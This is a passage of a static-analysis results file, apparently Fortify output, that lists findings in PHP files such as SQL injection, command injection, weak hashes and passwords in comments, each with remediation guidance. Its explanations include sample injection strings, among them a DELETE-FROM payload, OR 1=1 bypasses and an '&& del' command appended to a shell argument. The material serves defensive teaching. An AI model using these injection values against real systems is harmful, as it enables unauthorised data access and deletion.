            "text" : "It is never a good idea to hardcode a password. Storing password details within comments is equivalent to hardcoding passwords. Not only does it allow all of the project's developers to view the password, it also makes fixing the problem extremely difficult. After the code is in production, the password is now leaked to the outside world and cannot be protected or changed without patching the software. If the account protected by the password is compromised, the owners of the system must choose between security and availability.\n\nIn this case, the password details appear in the comment in low.php on line 8.\n\n\nExample: The following comment specifies the default password to connect to a database:\n\n\n...\n// Default username for database connection is \"scott\"\n// Default password for database connection is \"tiger\"\n...\n\n\nThis code will run successfully, but anyone who has access to it will have access to the password. An employee with access to this information can use it to break into the system.\n\nPasswords should never be hardcoded and should generally be obfuscated and managed in an external source. Storing passwords in plain text anywhere on the system allows anyone with sufficient permissions to read and potentially misuse the password.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4562/?engineType=SCA&issue=7B9DF4C5DE9DFC43704E68B3841E0EB5"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4585",
          "shortDescription" : {
            "text" : "Weak Cryptographic Hash"
          },
          "fullDescription" : {
            "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
          },
          "help" : {
            "text" : "MD2, MD4, MD5, RIPEMD-160, and SHA-1 are popular cryptographic hash algorithms often used to verify the integrity of messages and other data. However, as recent cryptanalysis research has revealed fundamental weaknesses in these algorithms, they should no longer be used within security-critical contexts.\n\nEffective techniques for breaking MD and RIPEMD hashes are widely available, so those algorithms should not be relied upon for security. In the case of SHA-1, current techniques still require a significant amount of computational power and are more difficult to implement. However, attackers have found the Achilles' heel for the algorithm, and techniques for breaking it will likely lead to the discovery of even faster attacks.\n\nDiscontinue the use of MD2, MD4, MD5, RIPEMD-160, and SHA-1 for data-verification in security-critical contexts. Currently, SHA-224, SHA-256, SHA-384, SHA-512, and SHA-3 are good alternatives. However, these variants of the Secure Hash Algorithm have not been scrutinized as closely as SHA-1, so be mindful of future research that might impact the security of these algorithms.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4585/?engineType=SCA&issue=8D51CDA178D466B831F9A91F8DC174E2"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4415",
          "shortDescription" : {
            "text" : "SQL Injection"
          },
          "fullDescription" : {
            "text" : "On line 16 of low.php, the program invokes a SQL query built using input potentially coming from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\n\n\n"
          },
          "help" : {
            "text" : "SQL injection errors occur when:\n\n1. Data enters a program from an untrusted source.\n\n2. The data is used to dynamically construct a SQL query.\n\nExample 1: The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where the owner matches the user name of the currently-authenticated user.\n\n\n\t...\n\t$userName = $_SESSION['userName'];\n\t$itemName = $_POST['itemName'];\n\t$query = \"SELECT * FROM items WHERE owner = '$userName' AND itemname = '$itemName';\";\n\t$result = mysql_query($query);\n\t...\n\n\nThe query intends to execute the following code:\n\n\n\tSELECT * FROM items\n\tWHERE owner = &lt;userName&gt;\n\tAND itemname = &lt;itemName&gt;;\n\n\nHowever, because the query is constructed dynamically by concatenating a constant query string and a user input string, the query only behaves correctly if itemName does not contain a single-quote character. If an attacker with the user name wiley enters the string \"name' OR 'a'='a\" for itemName, then the query becomes the following:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name' OR 'a'='a';\n\n\nThe addition of the OR 'a'='a' condition causes the where clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:\n\n\n\tSELECT * FROM items;\n\n\nThis simplification of the query allows the attacker to bypass the requirement that the query must only return items owned by the authenticated user. The query now returns all entries stored in the items table, regardless of their specified owner.\n\nExample 2: This example examines the effects of a different malicious value passed to the query constructed and executed in Example 1. If an attacker with the user name wiley enters the string \"name'; DELETE FROM items; --\" for itemName, then the query becomes the following two queries:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\n\n\tDELETE FROM items;\n\n\t--'\n\n\nMany database servers, including Microsoft(R) SQL Server 2000, allow multiple SQL statements separated by semicolons to be executed at once. While this attack string results in an error on Oracle and other database servers that do not allow the batch-execution of statements separated by semicolons, on databases that do allow batch execution, this type of attack allows the attacker to execute arbitrary commands against the database.\n\nNotice the trailing pair of hyphens (--), which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed [4]. In this case the comment character serves to remove the trailing single-quote left over from the modified query. On a database where comments are not allowed to be used in this way, the general attack could still be made effective using a trick similar to the one shown in Example 1. If an attacker enters the string \"name'); DELETE FROM items; SELECT * FROM items WHERE 'a'='a\", the following three valid statements will be created:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\n\n\tDELETE FROM items;\n\n\tSELECT * FROM items WHERE 'a'='a';\n\n\nOne traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from an allow list of safe values or identify and escape a list of potentially malicious values (deny list). Checking an allow list can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, implementing a deny list is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers may:\n\n    - Target fields that are not quoted\n    - Find ways to bypass the need for certain escaped metacharacters\n    - Use stored procedures to hide the injected metacharacters\n\nManually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.\n\nAnother solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.\n\nThe root cause of a SQL injection vulnerability is the ability of an attacker to change context in the SQL query, causing a value that the programmer intended to be interpreted as data to be interpreted as a command instead. When a SQL query is constructed, the programmer knows what should be interpreted as part of the command and what should be interpreted as data. Parameterized SQL statements can enforce this behavior by disallowing data-directed context changes and preventing nearly all SQL injection attacks. Parameterized SQL statements are constructed using strings of regular SQL, but where user-supplied data needs to be included, they include bind parameters, which are placeholders for data that is subsequently inserted. In other words, bind parameters allow the programmer to explicitly specify to the database what should be treated as a command and what should be treated as data. When the program is ready to execute a statement, it specifies to the database the runtime values to use for each of the bind parameters without the risk that the data will be interpreted as a modification to the command.\n\nWhen connecting to MySQL, the previous example can be rewritten to use parameterized SQL statements (instead of concatenating user supplied strings) as follows:\n\n\n\t...\n\t$mysqli = new mysqli($host,$dbuser, $dbpass, $db);\n\t$userName = $_SESSION['userName'];\n\t$itemName = $_POST['itemName'];\n\t$query = \"SELECT * FROM items WHERE owner = ? AND itemname = ?\";\n\t$stmt = $mysqli-&gt;prepare($query);\n\t$stmt-&gt;bind_param('ss',$username,$itemName);\n\t$stmt-&gt;execute();\n\t...\n\n\nThe MySQL Improved extension (mysqli) is available for PHP5 users of MySQL. Code that relies on a different database should check for similar extensions.\n\nMore complicated scenarios, often found in report generation code, require that user input affect the structure of the SQL statement, for instance by adding a dynamic constraint in the WHERE clause. Do not use this requirement to justify concatenating user input to create a query string. Prevent SQL injection attacks where user input must affect command structure with a level of indirection: create a set of legitimate strings that correspond to different elements you might include in a SQL statement. When constructing a statement, use input from the user to select from this set of application-controlled values.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4415/?engineType=SCA&issue=20A44396C382E50E5114D6B3D543C8CC"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4532",
          "shortDescription" : {
            "text" : "Password Management: Password in Comment"
          },
          "fullDescription" : {
            "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
          },
          "help" : {
            "text" : "It is never a good idea to hardcode a password. Storing password details within comments is equivalent to hardcoding passwords. Not only does it allow all of the project's developers to view the password, it also makes fixing the problem extremely difficult. After the code is in production, the password is now leaked to the outside world and cannot be protected or changed without patching the software. If the account protected by the password is compromised, the owners of the system must choose between security and availability.\n\nIn this case, the password details appear in the comment in low.php on line 22.\n\n\nExample: The following comment specifies the default password to connect to a database:\n\n\n...\n// Default username for database connection is \"scott\"\n// Default password for database connection is \"tiger\"\n...\n\n\nThis code will run successfully, but anyone who has access to it will have access to the password. An employee with access to this information can use it to break into the system.\n\nPasswords should never be hardcoded and should generally be obfuscated and managed in an external source. Storing passwords in plain text anywhere on the system allows anyone with sufficient permissions to read and potentially misuse the password.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4532/?engineType=SCA&issue=6C1FA89E483C2A8A8D43C9A70766F343"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4563",
          "shortDescription" : {
            "text" : "Password Management: Password in Comment"
          },
          "fullDescription" : {
            "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
          },
          "help" : {
            "text" : "It is never a good idea to hardcode a password. Storing password details within comments is equivalent to hardcoding passwords. Not only does it allow all of the project's developers to view the password, it also makes fixing the problem extremely difficult. After the code is in production, the password is now leaked to the outside world and cannot be protected or changed without patching the software. If the account protected by the password is compromised, the owners of the system must choose between security and availability.\n\nIn this case, the password details appear in the comment in medium.php on line 10.\n\n\nExample: The following comment specifies the default password to connect to a database:\n\n\n...\n// Default username for database connection is \"scott\"\n// Default password for database connection is \"tiger\"\n...\n\n\nThis code will run successfully, but anyone who has access to it will have access to the password. An employee with access to this information can use it to break into the system.\n\nPasswords should never be hardcoded and should generally be obfuscated and managed in an external source. Storing passwords in plain text anywhere on the system allows anyone with sufficient permissions to read and potentially misuse the password.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4563/?engineType=SCA&issue=7B9DF4C5DE9DFC43704E68B3841E0EB6"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4626",
          "shortDescription" : {
            "text" : "Weak Cryptographic Hash"
          },
          "fullDescription" : {
            "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
          },
          "help" : {
            "text" : "MD2, MD4, MD5, RIPEMD-160, and SHA-1 are popular cryptographic hash algorithms often used to verify the integrity of messages and other data. However, as recent cryptanalysis research has revealed fundamental weaknesses in these algorithms, they should no longer be used within security-critical contexts.\n\nEffective techniques for breaking MD and RIPEMD hashes are widely available, so those algorithms should not be relied upon for security. In the case of SHA-1, current techniques still require a significant amount of computational power and are more difficult to implement. However, attackers have found the Achilles' heel for the algorithm, and techniques for breaking it will likely lead to the discovery of even faster attacks.\n\nDiscontinue the use of MD2, MD4, MD5, RIPEMD-160, and SHA-1 for data-verification in security-critical contexts. Currently, SHA-224, SHA-256, SHA-384, SHA-512, and SHA-3 are good alternatives. However, these variants of the Secure Hash Algorithm have not been scrutinized as closely as SHA-1, so be mindful of future research that might impact the security of these algorithms.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4626/?engineType=SCA&issue=AB7E3BA42F77F50C64C20E71BE0641E2"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4695",
          "shortDescription" : {
            "text" : "SQL Injection"
          },
          "fullDescription" : {
            "text" : "On line 18 of medium.php, the program invokes a SQL query built using input potentially coming from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\n\n\n"
          },
          "help" : {
            "text" : "SQL injection errors occur when:\n\n1. Data enters a program from an untrusted source.\n\n2. The data is used to dynamically construct a SQL query.\n\nExample 1: The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where the owner matches the user name of the currently-authenticated user.\n\n\n\t...\n\t$userName = $_SESSION['userName'];\n\t$itemName = $_POST['itemName'];\n\t$query = \"SELECT * FROM items WHERE owner = '$userName' AND itemname = '$itemName';\";\n\t$result = mysql_query($query);\n\t...\n\n\nThe query intends to execute the following code:\n\n\n\tSELECT * FROM items\n\tWHERE owner = &lt;userName&gt;\n\tAND itemname = &lt;itemName&gt;;\n\n\nHowever, because the query is constructed dynamically by concatenating a constant query string and a user input string, the query only behaves correctly if itemName does not contain a single-quote character. If an attacker with the user name wiley enters the string \"name' OR 'a'='a\" for itemName, then the query becomes the following:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name' OR 'a'='a';\n\n\nThe addition of the OR 'a'='a' condition causes the where clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:\n\n\n\tSELECT * FROM items;\n\n\nThis simplification of the query allows the attacker to bypass the requirement that the query must only return items owned by the authenticated user. The query now returns all entries stored in the items table, regardless of their specified owner.\n\nExample 2: This example examines the effects of a different malicious value passed to the query constructed and executed in Example 1. If an attacker with the user name wiley enters the string \"name'; DELETE FROM items; --\" for itemName, then the query becomes the following two queries:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\n\n\tDELETE FROM items;\n\n\t--'\n\n\nMany database servers, including Microsoft(R) SQL Server 2000, allow multiple SQL statements separated by semicolons to be executed at once. While this attack string results in an error on Oracle and other database servers that do not allow the batch-execution of statements separated by semicolons, on databases that do allow batch execution, this type of attack allows the attacker to execute arbitrary commands against the database.\n\nNotice the trailing pair of hyphens (--), which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed [4]. In this case the comment character serves to remove the trailing single-quote left over from the modified query. On a database where comments are not allowed to be used in this way, the general attack could still be made effective using a trick similar to the one shown in Example 1. If an attacker enters the string \"name'); DELETE FROM items; SELECT * FROM items WHERE 'a'='a\", the following three valid statements will be created:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\n\n\tDELETE FROM items;\n\n\tSELECT * FROM items WHERE 'a'='a';\n\n\nOne traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from an allow list of safe values or identify and escape a list of potentially malicious values (deny list). Checking an allow list can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, implementing a deny list is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers may:\n\n    - Target fields that are not quoted\n    - Find ways to bypass the need for certain escaped metacharacters\n    - Use stored procedures to hide the injected metacharacters\n\nManually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.\n\nAnother solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.\n\nThe root cause of a SQL injection vulnerability is the ability of an attacker to change context in the SQL query, causing a value that the programmer intended to be interpreted as data to be interpreted as a command instead. When a SQL query is constructed, the programmer knows what should be interpreted as part of the command and what should be interpreted as data. Parameterized SQL statements can enforce this behavior by disallowing data-directed context changes and preventing nearly all SQL injection attacks. Parameterized SQL statements are constructed using strings of regular SQL, but where user-supplied data needs to be included, they include bind parameters, which are placeholders for data that is subsequently inserted. In other words, bind parameters allow the programmer to explicitly specify to the database what should be treated as a command and what should be treated as data. When the program is ready to execute a statement, it specifies to the database the runtime values to use for each of the bind parameters without the risk that the data will be interpreted as a modification to the command.\n\nWhen connecting to MySQL, the previous example can be rewritten to use parameterized SQL statements (instead of concatenating user supplied strings) as follows:\n\n\n\t...\n\t$mysqli = new mysqli($host,$dbuser, $dbpass, $db);\n\t$userName = $_SESSION['userName'];\n\t$itemName = $_POST['itemName'];\n\t$query = \"SELECT * FROM items WHERE owner = ? AND itemname = ?\";\n\t$stmt = $mysqli-&gt;prepare($query);\n\t$stmt-&gt;bind_param('ss',$username,$itemName);\n\t$stmt-&gt;execute();\n\t...\n\n\nThe MySQL Improved extension (mysqli) is available for PHP5 users of MySQL. Code that relies on a different database should check for similar extensions.\n\nMore complicated scenarios, often found in report generation code, require that user input affect the structure of the SQL statement, for instance by adding a dynamic constraint in the WHERE clause. Do not use this requirement to justify concatenating user input to create a query string. Prevent SQL injection attacks where user input must affect command structure with a level of indirection: create a set of legitimate strings that correspond to different elements you might include in a SQL statement. When constructing a statement, use input from the user to select from this set of application-controlled values.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4695/?engineType=SCA&issue=DC44B7114467267082258B17E27CBEFC"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4533",
          "shortDescription" : {
            "text" : "Password Management: Password in Comment"
          },
          "fullDescription" : {
            "text" : "Storing passwords or password details in plain text anywhere in the system or system code may compromise system security in a way that cannot be easily remedied.\n\n\n"
          },
          "help" : {
            "text" : "It is never a good idea to hardcode a password. Storing password details within comments is equivalent to hardcoding passwords. Not only does it allow all of the project's developers to view the password, it also makes fixing the problem extremely difficult. After the code is in production, the password is now leaked to the outside world and cannot be protected or changed without patching the software. If the account protected by the password is compromised, the owners of the system must choose between security and availability.\n\nIn this case, the password details appear in the comment in medium.php on line 24.\n\n\nExample: The following comment specifies the default password to connect to a database:\n\n\n...\n// Default username for database connection is \"scott\"\n// Default password for database connection is \"tiger\"\n...\n\n\nThis code will run successfully, but anyone who has access to it will have access to the password. An employee with access to this information can use it to break into the system.\n\nPasswords should never be hardcoded and should generally be obfuscated and managed in an external source. Storing passwords in plain text anywhere on the system allows anyone with sufficient permissions to read and potentially misuse the password.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4533/?engineType=SCA&issue=6C1FA89E483C2A8A8D43C9A70766F344"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4393",
          "shortDescription" : {
            "text" : "Weak Cryptographic Hash"
          },
          "fullDescription" : {
            "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
          },
          "help" : {
            "text" : "MD2, MD4, MD5, RIPEMD-160, and SHA-1 are popular cryptographic hash algorithms often used to verify the integrity of messages and other data. However, as recent cryptanalysis research has revealed fundamental weaknesses in these algorithms, they should no longer be used within security-critical contexts.\n\nEffective techniques for breaking MD and RIPEMD hashes are widely available, so those algorithms should not be relied upon for security. In the case of SHA-1, current techniques still require a significant amount of computational power and are more difficult to implement. However, attackers have found the Achilles' heel for the algorithm, and techniques for breaking it will likely lead to the discovery of even faster attacks.\n\nDiscontinue the use of MD2, MD4, MD5, RIPEMD-160, and SHA-1 for data-verification in security-critical contexts. Currently, SHA-224, SHA-256, SHA-384, SHA-512, and SHA-3 are good alternatives. However, these variants of the Secure Hash Algorithm have not been scrutinized as closely as SHA-1, so be mindful of future research that might impact the security of these algorithms.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4393/?engineType=SCA&issue=15CF0A77B580618926748C9470780B02"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4567",
          "shortDescription" : {
            "text" : "SQL Injection: Poor Validation"
          },
          "fullDescription" : {
            "text" : "Line 22 of test_credentials.php invokes an SQL query built using input coming from an untrusted source and uses HTML, XML, or other types of encoding that is not always enough to prevent malicious characters from being inserted into the query.\n\n\n"
          },
          "help" : {
            "text" : "The use of encoding functions such as mysql_real_escape_string() will prevent some, but not all SQL injection vulnerabilities. Relying on such encoding functions is equivalent to using a weak deny list to prevent SQL injection and might allow the attacker to modify the statement's meaning or to execute arbitrary SQL commands. Since it is not always possible to determine statically where input will appear within a given section of dynamically interpreted code, the Fortify Secure Coding Rulepacks may present validated dynamic SQL data as \"SQL Injection: Poor Validation\" issues, even though the validation may be sufficient to prevent SQL Injection within that context.\n\nSQL injection errors occur when:\n\n1. Data enters a program from an untrusted source.\n\n\n\n2. The data is used to dynamically construct a SQL query.\n\n\nIn this case, the data is passed to mysqli_query() in test_credentials.php on line 22.\n\n\nExample 1: The following example demonstrates how the configuration of the database can alter the behavior of mysqli_real_escape_string(). When the SQL mode is set to \"NO_BACKSLASH_ESCAPES\" the backslash character is treated as a normal character, and not an escape character[5]. Since mysqli_real_escape_string() takes this into account, the following query is vulnerable to SQL injection as \" is no longer escaped to \\\" due to the database configuration.\n\n\n  mysqli_query($mysqli, 'SET SQL_MODE=\"NO_BACKSLASH_ESCAPES\"');\n  ...\n  $userName = mysqli_real_escape_string($mysqli, $_POST['userName']);\n  $pass = mysqli_real_escape_string($mysqli, $_POST['pass']);\n  $query = 'SELECT * FROM users WHERE userName=\"' . $userName . '\"AND pass=\"' . $pass. '\";';\n  $result = mysqli_query($mysqli, $query);\n  ...\n\n\nIf an attacker leaves the password field blank and enters \" OR 1=1;--  for userName the quotation marks will not be escaped and the resulting query is as follows:\n\n\n  SELECT * FROM users\n  WHERE userName = \"\"\n  OR 1=1;\n  -- \"AND pass=\"\";\n\n\nSince OR 1=1 causes the where clause to always evaluate to true and the double hyphens cause the rest of the statement to be treated as a comment, the query becomes logically equivalent to the much simpler query:\n\n\n  SELECT * FROM users;\n\n\n\nOne traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from an allow list of safe values or identify and escape a list of potentially malicious values (deny list). Checking an allow list can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, implementing a deny list is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers may:\n\n    - Target fields that are not quoted\n    - Find ways to bypass the need for certain escaped metacharacters\n    - Use stored procedures to hide the injected metacharacters\n\nManually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.\n\nAnother solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.\n\nThe root cause of a SQL injection vulnerability is the ability of an attacker to change context in the SQL query, causing a value that the programmer intended to be interpreted as data to be interpreted as a command instead. When a SQL query is constructed, the programmer knows what should be interpreted as part of the command and what should be interpreted as data. Parameterized SQL statements can enforce this behavior by disallowing data-directed context changes and preventing nearly all SQL injection attacks. Parameterized SQL statements are constructed using strings of regular SQL, but where user-supplied data needs to be included, they include bind parameters, which are placeholders for data that is subsequently inserted. In other words, bind parameters allow the programmer to explicitly specify to the database what should be treated as a command and what should be treated as data. When the program is ready to execute a statement, it specifies to the database the runtime values to use for each of the bind parameters without the risk that the data will be interpreted as a modification to the command.\n\nExample 2: When connecting to MySQL, parameterized SQL statements should always be used instead of dynamically concatenating user supplied input, as follows:\n\n\n  ...\n  $mysqli = new mysqli($host,$dbuser, $dbpass, $db);\n  $userName = $_SESSION['userName'];\n  $itemName = $_POST['itemName'];\n  $query = \"SELECT * FROM items WHERE owner = ? AND itemname = ?\";\n  $stmt = $mysqli-&gt;prepare($query);\n  $stmt-&gt;bind_param('ss',$username,$itemName);\n  $stmt-&gt;execute();\n  ...\n\n\nThe MySQL Improved extension (mysqli) is available for PHP5 users of MySQL. Code that relies on a different database should check for similar extensions.\n\nMore complicated scenarios, often found in report generation code, require that user input affect the structure of the SQL statement, for instance by adding a dynamic constraint in the WHERE clause. Do not use this requirement to justify concatenating user input to create a query string. Prevent SQL injection attacks where user input must affect command structure with a level of indirection: create a set of legitimate strings that correspond to different elements you might include in a SQL statement. When constructing a statement, use input from the user to select from this set of application-controlled values.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4567/?engineType=SCA&issue=7DEF1A51719A0BDF2D477CEB988E969C"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4651",
          "shortDescription" : {
            "text" : "Command Injection"
          },
          "fullDescription" : {
            "text" : "Line 26 in high.php calls shell_exec() with a command built from untrusted data. This call can cause the program to execute malicious commands on behalf of an attacker.\n\n\n"
          },
          "help" : {
            "text" : "Command injection vulnerabilities take two forms:\n\n- An attacker can change the command that the program executes: the attacker explicitly controls what the command is.\n\n- An attacker can change the environment in which the command executes: the attacker implicitly controls what the command means.\n\nIn this case, we are primarily concerned with the first scenario, the possibility that an attacker may be able to control the command that is executed. Command injection vulnerabilities of this type occur when:\n\n1. Data enters the application from an untrusted source.\n\n\n2. The data is used as or as part of a string representing a command that is executed by the application.\n\nIn this case, the command is executed by shell_exec() in high.php on line 26.\n\n3. By executing the command, the application gives an attacker a privilege or capability that the attacker would not otherwise have.\n\nExample 1: The following code from a system utility uses the system property APPHOME to determine the directory in which it is installed and then executes an initialization script based on a relative path from the specified directory.\n\n\n\t...\n\t$home = $_ENV['APPHOME'];\n\t$cmd = $home . $INITCMD;\n\tsystem(cmd);\n\t...\n\n\nThe code in Example 1 allows an attacker to execute arbitrary commands with the elevated privilege of the application by modifying the system property APPHOME to point to a different path containing a malicious version of INITCMD. Because the program does not validate the value read from the environment, if an attacker can control the value of the system property APPHOME, then they can fool the application into running malicious code and take control of the system.\n\nExample 2: The following code is from an administrative web application designed to allow users to kick off a backup of an Oracle database using a batch-file wrapper around the rman utility and then run a cleanup.bat script to delete some temporary files. The script rmanDB.bat accepts a single command line parameter, which specifies the type of backup to perform. Because access to the database is restricted, the application runs the backup as a privileged user.\n\n\n...\n$btype = $_GET['backuptype'];\n$cmd = \"cmd.exe /K \\\"c:\\\\util\\\\rmanDB.bat \" . $btype . \"&amp;&amp;c:\\\\util\\\\cleanup.bat\\\"\";\nsystem(cmd);\n...\n\n\nThe problem here is that the program does not do any validation on the backuptype parameter read from the user. Typically the Runtime.exec() function will not execute multiple commands, but in this case the program first runs the cmd.exe shell in order to run multiple commands with a single call to Runtime.exec(). After the shell is invoked, it will allow for the execution of multiple commands separated by two ampersands. If an attacker passes a string of the form \"&amp;&amp; del c:\\\\dbms\\\\*.*\", then the application will execute this command along with the others specified by the program. Because of the nature of the application, it runs with the privileges necessary to interact with the database, which means whatever command the attacker injects will run with those privileges as well.\n\nExample 3: The following code is from a web application that provides an interface through which users can update their password on the system. Part of the process for updating passwords in certain network environments is to run a make command in the /var/yp directory.\n\n\n...\n$result = shell_exec(\"make\");\n...\n\n\nThe problem here is that the program does not specify an absolute path for make and fails to clean its environment prior to executing the call to Runtime.exec(). If an attacker can modify the $PATH variable to point to a malicious binary called make and cause the program to be executed in their environment, then the malicious binary will be loaded instead of the one intended. Because of the nature of the application, it runs with the privileges necessary to perform system operations, which means the attacker's make will now be run with these privileges, possibly giving the attacker complete control of the system.\n\nDo not allow users to have direct control over the commands executed by the program. In cases where user input must affect the command to be run, use the input only to make a selection from a predetermined set of safe commands. If the input appears to be malicious, the value passed to the command execution function should either default to some safe selection from this set or the program should decline to execute any command at all.\n\nIn cases where user input must be used as an argument to a command executed by the program, this approach often becomes impractical because the set of legitimate argument values is too large or too hard to keep track of. Developers often fall back on implementing a deny list in these situations. A deny list is used to selectively reject or escape potentially dangerous characters before using the input. Any list of unsafe characters is likely to be incomplete and will be heavily dependent on the system where the commands are executed. A better approach is to create a list of characters that are permitted to appear in the input and accept input composed exclusively of characters in the approved set.\n\nAn attacker may indirectly control commands executed by a program by modifying the environment in which they are executed. The environment should not be trusted and precautions should be taken to prevent an attacker from using some manipulation of the environment to perform an attack. Whenever possible, commands should be controlled by the application and executed using an absolute path. In cases where the path is not known at compile time, such as for cross-platform applications, an absolute path should be constructed from trusted values during execution. Command values and paths read from configuration files or the environment should be sanity-checked against a set of invariants that define valid values.\n\nOther checks can sometimes be performed to detect if these sources may have been tampered with. For example, if a configuration file is world-writable, the program might refuse to run. In cases where information about the binary to be executed is known in advance, the program may perform checks to verify the identity of the binary. If a binary should always be owned by a particular user or have a particular set of access permissions assigned to it, these properties can be verified programmatically before the binary is executed.\n\nAlthough it may be impossible to completely protect a program from an imaginative attacker bent on controlling the commands the program executes, be sure to apply the principle of least privilege wherever the program executes an external command: do not hold privileges that are not essential to the execution of the command.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4651/?engineType=SCA&issue=BCFFF9829E271E2DE851312944CA882D"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4363",
          "shortDescription" : {
            "text" : "Command Injection"
          },
          "fullDescription" : {
            "text" : "Line 30 in high.php calls shell_exec() with a command built from untrusted data. This call can cause the program to execute malicious commands on behalf of an attacker.\n\n\n"
          },
          "help" : {
            "text" : "Command injection vulnerabilities take two forms:\n\n- An attacker can change the command that the program executes: the attacker explicitly controls what the command is.\n\n- An attacker can change the environment in which the command executes: the attacker implicitly controls what the command means.\n\nIn this case, we are primarily concerned with the first scenario, the possibility that an attacker may be able to control the command that is executed. Command injection vulnerabilities of this type occur when:\n\n1. Data enters the application from an untrusted source.\n\n\n2. The data is used as or as part of a string representing a command that is executed by the application.\n\nIn this case, the command is executed by shell_exec() in high.php on line 30.\n\n3. By executing the command, the application gives an attacker a privilege or capability that the attacker would not otherwise have.\n\nExample 1: The following code from a system utility uses the system property APPHOME to determine the directory in which it is installed and then executes an initialization script based on a relative path from the specified directory.\n\n\n\t...\n\t$home = $_ENV['APPHOME'];\n\t$cmd = $home . $INITCMD;\n\tsystem(cmd);\n\t...\n\n\nThe code in Example 1 allows an attacker to execute arbitrary commands with the elevated privilege of the application by modifying the system property APPHOME to point to a different path containing 